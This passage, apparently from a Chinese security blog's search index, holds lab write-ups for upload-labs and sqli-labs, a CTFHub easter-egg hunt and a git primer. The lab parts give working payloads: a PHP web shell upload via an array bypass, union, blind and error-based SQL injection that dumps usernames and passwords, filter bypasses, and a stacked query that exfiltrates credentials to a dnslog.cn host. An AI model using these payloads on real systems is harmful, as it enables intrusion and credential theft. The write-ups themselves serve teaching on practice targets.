123456789101112131415161718192021222324252627282930313233343536$is_upload = false; $msg = null; if(!empty($_FILES[&#39;upload_file&#39;])){ //检查MIME $allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;); if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type)){ $msg = &quot;禁止上传该类型文件!&quot;; }else{ //检查文件名 $file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;]; if (!is_array($file)) { $file = explode(&#39;.&#39;, strtolower($file)); //explode(separator,string[,limit]) 函数，使用一个字符串分割另一个字符串，并返回由字符串组成的数组。 } $ext = end($file);//end(array)函数，输出数组中的当前元素和最后一个元素的值。 $allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); if (!in_array($ext, $allow_suffix)) { $msg = &quot;禁止上传该后缀文件!&quot;; }else{ $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1]; //reset(array)函数，把数组的内部指针指向第一个元素，并返回这个元素的值 //count(array)函数，计算数组中的单元数目，或对象中的属性个数 $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = &quot;文件上传成功！&quot;; $is_upload = true; } else { $msg = &quot;文件上传失败！&quot;; } } } }else{ $msg = &quot;请选择要上传的文件！&quot;; } 验证上传路径是否存在验证[‘upload_file’]的 content-type 是否合法（可以抓包修改） 判断 POST 参数是否为空定义$file 变量（关键：构造数组绕过下一步的判断） 判断 file 不是数组则使用 explode(‘.’, strtolower($file))对 file 进行切割，将 file 变为一个数组 判断数组最后一个元素是否合法 数组第一位和$file[count($file) - 1]进行拼接，产生保存文件名 file_name 上传文件 这里可以用 00 截断 也可以用数组绕过 post 包 123456789101112131415161718-----------------------------131314876217456529963542266439 Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;yijuhua.php&quot; Content-Type: image/png &lt;?php @eval($_POST[&#39;hack&#39;]);?&gt; -----------------------------131314876217456529963542266439 Content-Disposition: form-data; name=&quot;save_name[0]&quot; upload-20.php -----------------------------131314876217456529963542266439 Content-Disposition: form-data; name=&quot;save_name[2]&quot; jpg -----------------------------131314876217456529963542266439 Content-Disposition: form-data; name=&quot;submit&quot; 上传 -----------------------------131314876217456529963542266439--","categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"upload","slug":"upload","permalink":"https://s1rius.space/tags/upload/"},{"name":"upload-labs","slug":"upload-labs","permalink":"https://s1rius.space/tags/upload-labs/"}],"author":"s1rius"},{"title":"sqli-lab","slug":"sqli-lab","date":"2022-02-25T16:00:00.000Z","updated":"2022-02-25T16:00:00.000Z","comments":true,"path":"2022/02/sqli-lab/","permalink":"https://s1rius.space/2022/02/sqli-lab/","excerpt":"","text":"sql 注入就是 当用户输入一些本不是用户名密码的 sql 语句 这些语句没有被过滤 执行后通过回显等方式，使注入者获得了数据库的信息 水了几天用来搞 visual studio2022 和 Windows11 所以本文略微简陋写，以后会完善 visual studio2022 版美化教程见Visual Studio 2022 界面美化教程. GET 传参 先放代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); // take the variables if(isset($_GET[&#39;id&#39;])) { $id=$_GET[&#39;id&#39;]; //logging the connection parameters to a file for analysis. $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;); fwrite($fp,&#39;ID:&#39;.$id.&quot;\\n&quot;); fclose($fp); // connectivity //注意get传参 获取到输入的id后先打开一个result.txt然后把你上传的写入到那个文件里 这样你再一次操作后你就可以看到你的注入语句真正注进去的是啥了 $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;; //上面一行中$id前后的符号是关键，是注入语句闭合的符号 $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;//正确回显颜色为绿色 echo &#39;Your Login name:&#39;. $row[&#39;username&#39;]; echo &quot;&lt;br&gt;&quot;; echo &#39;Your Password:&#39; .$row[&#39;password&#39;]; echo &quot;&lt;/font&gt;&quot;; } //这是输入正确时的反馈，直接把运行结果告诉你 但是后几关就不一样了 else { echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;//报错回显为黄色 print_r(mysql_error()); echo &quot;&lt;/font&gt;&quot;; } //这是输入错误时的反馈，把mysql_error反馈给你 同样，后几关也不一样了 } else { echo &quot;Please input the ID as parameter with numeric value&quot;;} //这是反馈你输入为空的 ?&gt; /* *我为了让读者能看得更清晰，我将注释符的右半部分删去，就像这句一样没有* */（你细品这句话 悖论） 我第一个注释是：注意 get 传参，前 10 关前半部分代码不变 第二个注释是提示读者要注意每一关的闭合方式（包裹方式） 在 if 后 else 前是正确回显部分 在 else 后是错误回显部分 这两部分是区分注入方式所需要关注的 先讲理论 根据两部分分别是否回显判断注入方式 注入方式包含联合查询、布尔盲注、时间盲注、报错注入等 传参 最基础的就是?id=1’、username=admin’这类传参语句，后面的’引号是闭合方式上面有讲，他用的啥符号闭合，你就要用相同的符号来闭合你的语句，输入这类最基础的注入语句来判断是否有报错回显 回显是黄色，代码段注释里有写 判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数 1?id=1’ order by 1--+ 这里的省略号只要不报错 就加大数字，直到报错的前一个数字，就是回显的行数 判断回显的数据是数据库中的哪几列 1?id=-1’ union select 1,2,3--+ 这里的数字的最大值要等与上一步得到的那个数 上一步 7 报错，那行数就是 6，这一步就要 1，2，3，4，5，6–+ 看看那几个数字出现在你屏幕上了 要注意要 id=一个不正确的值 如 0，-1 之类 这样联合查询之后的返回值会让 union 之后的查询语句的结果在数组的第一列，而后台 php 代码只会回显第一列的数据 查库名 1?id=-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata --+ 这里把查数据库的 sql 语句，替换掉出现在你屏幕上的一个数字 这里是 3 来回显在屏幕上 group_concat(你要查询的数据）from 所在的库 表 列 这里查库名即查schema_name 这个数据被保存在information_schema.schemata 这样 回显的就是 数据库们 的名字 查表名 1?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’–+ table 表 information_schema.tables 类比上面 table_schema=‘ 库名’ 这里你要猜一下哪个数据库会放着你想要的数据，然后输在库名那个位置 查列名 1?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’--+ 同样类比上面 column 列 这里还要猜 上面回显的哪个表里有你要的数据 提取数据 激动人心的时候到了 1?id=-1’ union select 1,2,group_concat(concat_ws(’~’,username,password)) from users–+ 同样类比上面 有一处特殊 concat_ws(符号，列名，列名） 中间那个符号会被 concat_ws 插入到两组数据之间，就是为了方便看 这样就查到数据了，是不是很简单。 limit limit 是限制那一部分显示，limitx，y 是从 x+1 开始显示 y 个 实操 正错回显都有 就按上面的步骤一步一步找到数据 security———&gt;users——&gt;username&amp;password 这就是靶场数据库的层次 图啥的以后再补 理论进阶 时间盲注 12?id=1’ and sleep (5)–+ ?id=1‘ and if((left((select schema_name from information_schema.schemata limit 4,1),1,1)=‘s’),1,sleep(3))–+ 这样的句子 sleep()就是延时执行的意思， 让浏览器先睡一会 当你想判断对不对的时候，你就让对的睡一会，错的继续肝，这样你就能看出来了 布尔盲注 下面几个方法各有优缺点 因为能知道 sql-lab 靶场数据库的数据 所以刷题时我多用 left 实际 substr substr(a,b,c)将 a 字段从第 b 个字符读取 c 个字符 ascii 将括号中的字符转换为 acsii 码，再在最后进行值大小的判断，正确返回 1，错误返回 0 类似于数学中的二分法 left left(a)从第一位开始读取 a 个字符 模糊查询 like a like ‘%b%’ 判断 a 字符串里是否有 b a like ‘b%’ 判断 a 开头是否有 b 数 regexp regexp ‘a’正则表达式 RegExp 对象表示正则表达式，它是对字符串执行模式匹配的强大工具 正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。 许多语言都有正则表达式 物理也有正则 所以正则是个啥(≧﹏ ≦) 实操进阶 有报错回显 无正确回显 也就是说你在前四关能看见的绿字在 5-8 关用 you are in 替换了 也就是你之前查的库名 表名 列名 和数据不会回显了 当使用布尔盲注时 如果判断正确就会显示 you are in 不正确的话就会报错 下图是第五关第一个用户名 最后一步注入语句 之前步骤参考第 1 到 4 关查各类信息的语句并用布尔盲注所用函数包装 正确回显和报错回显都没有 不论你输入啥，他都会说 you are in 就像你说 啊对对对 这样 布尔盲注也没法用了 你不知道注入语句是对是错 这时就要用时间盲注了 把布尔盲注再进行包装 if(布尔盲注语句,sleep(3),1) 正确的话，浏览器会延时 3 秒再运行 POST 传参 先讲理论 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;!--Form to post the data for sql injections Error based SQL Injection--&gt; &lt;form action=&quot;&quot; name=&quot;form1&quot; method=&quot;post&quot;&gt; &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;input type=&quot;text&quot; name=&quot;uname&quot; value=&quot;&quot;/&gt; &lt;/div&gt; &lt;div&gt; Password : &amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt; &lt;/div&gt;&lt;/br&gt; &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt; &lt;/div&gt; &lt;/form&gt; `上面是前端 通过post传参uname和passwd` &lt;?php // take the variables if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;])) { $uname=$_POST[&#39;uname&#39;]; $passwd=$_POST[&#39;passwd&#39;]; /后端接收前端传的参数 //logging the connection parameters to a file for analysis. $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;); fwrite($fp,&#39;User Name:&#39;.$uname); fwrite($fp,&#39;Password:&#39;.$passwd.&quot;\\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo &#39;&lt;font color= &quot;#0000ff&quot;&gt;&#39;; echo &quot;&lt;br&gt;&quot;; echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#39;; //echo &quot; You Have successfully logged in\\n\\n &quot; ; echo &#39;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#39;; echo &quot;&lt;br&gt;&quot;; echo &#39;Your Login name:&#39;. $row[&#39;username&#39;]; echo &quot;&lt;br&gt;&quot;; echo &#39;Your Password:&#39; .$row[&#39;password&#39;]; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#39;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#39;; /又是这里分成两部分，上面是正确回显 下面是报错回显 echo &quot;&lt;/font&gt;&quot;; } else { echo &#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#39;; echo &quot;&lt;/font&gt;&quot;; } } ?&gt; post传参 post 传参有很多方式最本质的就是在输入框传 然后是一些插件具有传参功能 hackbar 他们一般需要配合抓包的插件使用 较多的是一些抓包软件，burpsuit 等 他们既有抓包功能，也有重发器，测试器功能强大 注入语句 和 get 传参类型的语句大体相同，不同的地方有原来的 id=1’由于 get 传参，抓包后自动写入 uname/password=所以只需要写后面的 admin’ 加上 sql 执行语句，原理一样，都是让系统执行完传参后继续把 sql 语句执行来回显 这里末尾注释符可用# 实操 post 传参同样有三大类 正误回显都有 在 burpsuit 重发器里传参， 红字部分即为注入语句，这里同样只展示最后一步 其他可按照 get 传参原理 只需改动小部分 没正确回显 有报错回显 这里我采用了辨识度更高的时间盲注 布尔盲注同样使用 正错回显都没有 同上面直接时间盲注 基于报错注入的各种传参方式 先讲报错注入 updatexml updatexml (XML_document, XPath_string, new_value) 替换查找到的符合条件的数据 extactvalue extractvalue(XML_document, XPath_string) 对 XML 文档进行查询的函数 当上述两个函数的 xpath 路径出错时，将 XML_document 报错返回回来 注意只能返回 32 个字符，后面的可用 limit 等来限制返回的字符位置 传参方式 burp suite 抓包后改相应数据 user-agent 注入 1User-Agent:&#39;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#39; referer 注入 cookie 注入 base64 加密的 cookie 注入 将 payload 经 base64 加密后上传即可 过滤注释的GET 源码中过滤掉了注释符 注释符不能用了所以要在闭合上下功夫 12?id=&#39; union select 1,group_concat(username),group_concat(password) from users where 1 or &#39;1&#39; = &#39;1 ?id=-1&#39; union select 1,(select group_concat(username) from users),&#39;3 在末尾构造语句使闭合符号与语句组成一个不影响的语句 闭合方式多种多样 二次注入 首先注册一个用户 admin‘# 然后登录 修改密码 当你修改密码时 后台就执行了 1UPDATE users SET passwd=&quot;新密码&quot; WHERE username =&#39; admin&#39; # &#39; AND password=&#39; 也就是 你用 admin’#用户把 admin 用户的密码给改了 过滤 过滤 or 和 and 将 payload 里所有 and 和 or 替换为 anandd 和 oorr 这里 password 也要变成 passwoorrd 1?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) from users# 过滤下的报错注入 26 12345678$id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id); /strip out OR (non case sensitive) $id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id); /Strip out AND (non case sensitive) $id= preg_replace(&#39;/[\\/\\*]/&#39;,&quot;&quot;, $id); /strip out */ $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id); /Strip out -- $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id); /Strip out # $id= preg_replace(&#39;/[\\s]/&#39;,&quot;&quot;, $id); /Strip out spaces $id= preg_replace(&#39;/[\\/\\\\\\\\]/&#39;,&quot;&quot;, $id); /Strip out slashes return $id; 要用到||代替 or information 里的 or 要双写，用||‘1’=‘1 来闭合 1?id=0&#39;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),1)||&#39;1&#39;=&#39;1 27 1?id=0&#39;||updatexml(1,concat(0x7e,(SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;security&#39;))),1)||&#39;1&#39;=&#39;1 大小写 select 和 union 过滤下的时间盲注 26 到 27 关的 a 都是无法报错注入的 能用时间盲注过滤方法和不带 a 的关一样 waf 12345678910111213141516171819202122232425262728293031323334/ take the variables if(isset($_GET[&#39;id&#39;])){ $qs = $_SERVER[&#39;QUERY_STRING&#39;]; $hint=$qs; $id1=java_implimentation($qs); $id=$_GET[&#39;id&#39;]; //echo $id1; whitelist($id1);} /WAF implimentation with a whitelist approach..... only allows input to be Numeric. function whitelist($input){ $match = preg_match(&quot;/^\\d+$/&quot;, $input); if($match) {//echo &quot;you are good&quot;; //return $match; } else {header(&#39;Location: hacked.php&#39;); //echo &quot;you are bad&quot;; } } / The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution). function java_implimentation($query_string){ $q_s = $query_string; $qs_array= explode(&quot;&amp;&quot;,$q_s); foreach($qs_array as $key =&gt; $value){ $val=substr($value,0,2); if($val==&quot;id&quot;){ $id_value=substr($value,3,30); return $id_value; echo &quot;&lt;br&gt;&quot;; break;} } } java_implimentation 模拟 tomcat 的查询函数处理 whitelist 白名单过滤 检测到不符合规则就重定向 漏洞是 whitelist 只检测了 java_implimentation 输出的第一个参数$id_value 后面的逃过检测 注入点在后面 宽字节注入 MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，因为过滤方法主要就是在敏感字符前面添加 反斜杠 \\，所以这里想办法干掉反斜杠即可。 urlencode(’) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把%df%5c 当做是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。 结束注释 当转译为‘/时可用’/**/来结束注释 堆叠注入 在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。结束一个 sql 语句后继续构造下一条语句，会一起执行 因此产生了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间区别在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句 堆叠注入为攻击者提供了很多的攻击手段，通过添加一个新 的查询或者终止查询，可以达到修改数据和调用存储过程的目的。这种技术在 SQL 注入中还是比较频繁的。 如下展示了堆叠注入插入了一个用户数据 同时也可以进行 dnslog 注入 1?id=1&#39;;select load_file(concat(&#39;//&#39;,(select hex(concat_ws(&#39;~&#39;,username,password)) from users limit 0,1),&#39;.au0mvd.dnslog.cn/1.txt&#39;));--+ 123desc查看表结构的详细信息 desc table_name; 此处desc是describe的缩写，用法: desc 表名/查询语句 handler 适用于 select 等过滤 12345handler handler_table open; handler handler_table read first; handler handler_table read next; …… handler handler_table close; 二次注入进阶 需成功登录才能二次注入 12345678910111213141516171819202122232425262728293031323334353637383940414243444546function sqllogin($host,$dbuser,$dbpass, $dbname){ // connectivity //mysql connections for stacked query examples. $con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname); $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]); $password = $_POST[&quot;login_password&quot;]; // Check connection if (mysqli_connect_errno($con1)) { echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); } else { @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database ######: &quot;); } /* execute multi query */ $sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;; if (@mysqli_multi_query($con1, $sql)) { /* store first result set */ if($result = @mysqli_store_result($con1)) { if($row = @mysqli_fetch_row($result)){ if ($row[1]) { return $row[1]; } else{ return 0; } } } else { echo &#39;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#39;; print_r(mysqli_error($con1)); echo &quot;&lt;/font&gt;&quot;; } } else { echo &#39;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#39;; print_r(mysqli_error($con1)); echo &quot;&lt;/font&gt;&quot;; } 这里对 username 和 password 过滤不强 可通过万能密码 11’ or &#39;1&#39;=&#39;1 登录 接下来通过修改密码界面二次注入 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?PHP session_start(); if (!isset($_COOKIE[&quot;Auth&quot;])){ if (!isset($_SESSION[&quot;username&quot;])) { header(&#39;Location: index.php&#39;); } header(&#39;Location: index.php&#39;); } ?&gt; &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); if (isset($_POST[&#39;submit&#39;])){ # Validating the user input........ $username= $_SESSION[&quot;username&quot;]; $curr_pass= mysql_real_escape_string($_POST[&#39;current_password&#39;]);//原密码 还是万能密码绕过 $pass= mysql_real_escape_string($_POST[&#39;password&#39;]);//新密码 $re_pass= mysql_real_escape_string($_POST[&#39;re_password&#39;]); if($pass==$re_pass){ $sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;; $res = mysql_query($sql) or die(&#39;You tried to be smart, Try harder!!!! :( &#39;); $row = mysql_affected_rows(); echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;; echo &#39;&lt;center&gt;&#39;; if($row==1){ //echo &quot;Password successfully updated&quot;; echo &#39;&lt;img src=&quot;../images/password-updated.jpg&quot;&gt;&#39;; } else{ header(&#39;Location: failed.php&#39;); //echo &#39;You tried to be smart, Try harder!!!! :( &#39;; } } else{ echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#39;; echo &quot;Make sure New Password and Retype Password fields have same value&quot;; header(&#39;refresh:2, url=index.php&#39;); } } ?&gt; &lt;?php if(isset($_POST[&#39;submit1&#39;])) { session_destroy(); setcookie(&#39;Auth&#39;, 1 , time()-3600); header (&#39;Location: index.php&#39;); } ?&gt; 他用户名通过 session 获取，所以无法更改其他用户 order by注入 1SELECT * FROM users ORDER BY order by 与 where 差不多 但不同是 order by 不能使用 union 联合 其他都可 也比较灵活 从 46 到 53 关皆为 order by 注入 限制次数的注入 从 54 关开始，限制了注入次数 一旦超过次数就会改变数据 一切又要重新开始 58-62 可以报错注入 从 62 关开始只能使用盲注 id注入部分代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;?php id注入部分代码 //including the Mysql connect parameters. include &#39;../sql-connections/sql-connect-1.php&#39;; include &#39;../sql-connections/functions.php&#39;; error_reporting(0); $pag = $_SERVER[&#39;PHP_SELF&#39;]; /generating page address to piggy back after redirects... $characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;; /characterset for generating random data $times= 10; $table = table_name(); $col = column_name(1); / session id column name $col1 = column_name(2); /secret key column name / Submitting the final answer if(!isset($_POST[&#39;answer_key&#39;])){ / resetting the challenge and repopulating the table . if(isset($_POST[&#39;reset&#39;])){ setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000); echo &quot;&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\\n&quot;; echo &quot;Redirecting you to main challenge page..........\\n&quot;; header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; ); //echo &quot;cookie expired&quot;; } else{ / Checking the cookie on the page and populate the table with random value. if(isset($_COOKIE[&#39;challenge&#39;])){ $sessid=$_COOKIE[&#39;challenge&#39;]; //echo &quot;Cookie value: &quot;.$sessid; } else{ $expire = time()+60*60*24*30; $hash = data($table,$col); setcookie(&quot;challenge&quot;, $hash, $expire); } echo &quot;&lt;br&gt;\\n&quot;; /take the variables if(isset($_GET[&#39;id&#39;])){ $id=$_GET[&#39;id&#39;]; /logging the connection parameters to a file for analysis. $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;); fwrite($fp,&#39;ID:&#39;.$id.&quot;\\n&quot;); fclose($fp); /update the counter in database next_tryy(); /Display attempts on screen. $tryyy = view_attempts(); echo &quot;You have made : &quot;. $tryyy .&quot; of $times attempts&quot;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;\\n&quot;; /Reset the Database if you exceed allowed attempts. if($tryyy &gt;= ($times+1)){ setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000); echo &quot;&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\\n&quot;; echo &quot;Redirecting you to challenge page..........\\n&quot;; header( &quot;refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; ); echo &quot;&lt;br&gt;\\n&quot;; } / Querry DB to get the correct output $sql=&quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row){ echo &#39;&lt;font color= &quot;#00FFFF&quot;&gt;&#39;; echo &#39;Your Login name:&#39;. $row[&#39;username&#39;]; echo &quot;&lt;br&gt;&quot;; echo &#39;Your Password:&#39; .$row[&#39;password&#39;]; echo &quot;&lt;/font&gt;&quot;; } else { echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;; // print_r(mysql_error()); echo &quot;&lt;/font&gt;&quot;; } } else{ echo &quot;Please input the ID as parameter with numeric value as done in Lab excercises\\n&lt;br&gt;&lt;br&gt;\\n&lt;/font&gt;&quot;; echo &quot;&lt;font color=&#39;#00FFFF&#39;: size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;(&#39;CHALLENGES&#39;)&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;&quot;; echo &quot;For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;&quot; ; } } } 答案提交部分 1234567891011121314151617181920212223242526272829else { echo &#39;&lt;div style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&#39;; $key = addslashes($_POST[&#39;key&#39;]); $key = mysql_real_escape_string($key); //echo $key; /Query table to verify your result $sql=&quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&quot;; //echo &quot;$sql&quot;; $result=mysql_query($sql)or die(&quot;error in submittion of Key Solution&quot;.mysql_error()); $row = mysql_fetch_array($result); if($row) { echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;; echo &quot;\\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;; echo &#39;&lt;img src=&quot;../images/Less-54-1.jpg&quot; /&gt;&#39;; echo &quot;&lt;/font&gt;&quot;; header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; ); } else { echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;; echo &quot;\\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;; echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;; header( &quot;refresh:3;url=index.php&quot; ); //print_r(mysql_error()); echo &quot;&lt;/font&gt;&quot;; } } ?&gt;","categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"sql","slug":"sql","permalink":"https://s1rius.space/tags/sql/"},{"name":"sqli-lab","slug":"sqli-lab","permalink":"https://s1rius.space/tags/sqli-lab/"}],"author":"s1rius"},{"title":"ctfhub-彩蛋","slug":"CTFHub彩蛋","date":"2022-02-18T16:00:00.000Z","updated":"2022-02-18T16:00:00.000Z","comments":true,"path":"2022/02/CTFHub彩蛋/","permalink":"https://s1rius.space/2022/02/CTFHub%E5%BD%A9%E8%9B%8B/","excerpt":"","text":"工具 彩蛋 一开始的想法是工具一共有 8 页，想抓个包改下看看有没有第九页 抓包后发现不管哪一页 limit 都是 12 但 offset 在变化 于是 这样设置参数 在长度为 1000 到 6、7 千左右随便一个双击后 点击响应 看响应包 在最后一行 首页 彩蛋 api中间框内隐藏着两行字 ctfhub{c18732f48a96c40d40a06e74b1305706} 题目入口 彩蛋 在 web-ssrf 中间那一列的某些题传参错误时会出现 详情见ctfhub-ssrfpost 最后一行介绍 公众号 公众号彩蛋坑的一批！ 首先要先绑定 然后点彩蛋 它提示要回复正确的关键词 我*#@% 我回复过 彩蛋 关键词 egg ctfhub CTFHub 拿来把你 CTFer 自己人 …… 到底没想到竟然是 flag 投稿提交 彩蛋 只找到了前半部分 分别在题目提交和 wp 提交页面的最后 1234ctfhub{029e02eb3a1 e8c49b1132b5 15b652a5f3a8 62013} 最后这个彩蛋剩余部分也没找到 网上搜了下才明白：感谢 anweilx 的wp 第一行是俩页面的最后有 第二行是在俩页面源码 分别搜奖励 在上面那行一个是 base64 然后再转 url 一个是 hex 解码 第三行是俩页面的图片隐写 丢进 winhex 第四行有提示 aes 256 ecb解码 其他彩蛋 剩余皆可在对应页面搜索 egg 即可获得","categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"ctfhub","slug":"ctfhub","permalink":"https://s1rius.space/tags/ctfhub/"}],"author":"s1rius"},{"title":"git命令","slug":"git","date":"2022-02-15T16:00:00.000Z","updated":"2022-02-15T16:00:00.000Z","comments":true,"path":"2022/02/git/","permalink":"https://s1rius.space/2022/02/git/","excerpt":"","text":"创建仓库命令 init git init 命令用于在目录中创建新的 Git 仓库。 在文件夹中，会被创建出一个.git 的一个隐藏文件，这时，本地库已经初始化完成. clone git clone 拷贝一个 Git 仓库到本地，让自己能够查看该项目，或者进行修改。 拷贝项目命令格式如下： 1git clone [url] 提交与修改 add git add 命令可将该文件添加到暂存区。 添加一个或多个文件到暂存区 commit git commit 命令将暂存区内容添加到本地仓库中。 提交暂存区到本地仓库中: 1git commit -m [message] [message] 可以是一些备注信息。 status git status 命令用于查看在你上次提交之后是否有对文件进行再次修改。 rm git rm 命令用于删除文件。 如果只是简单地从工作目录中手工删除文件，运行 git status 时就会在 Changes not staged for commit 的提示。 mv git mv 命令用于移动或重命名一个文件、目录或软连接。 1git mv [file] [newfile] 如果新文件名已经存在，但还是要重命名它，可以使用 -f 参数： 1git mv -f [file] [newfile] 远程操作 remote 显示所有远程仓库： 1git remote -v pull git pull 命令用于从远程获取代码并合并本地的版本。 1git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt; push git push 命用于从将本地的分支版本上传到远程并合并。 1git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;","categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"git","slug":"git","permalink":"https://s1rius.space/tags/git/"}],"author":"s1rius"},{"title":"Visual Studio 2022界面美化教程","slug":"Visual Studio 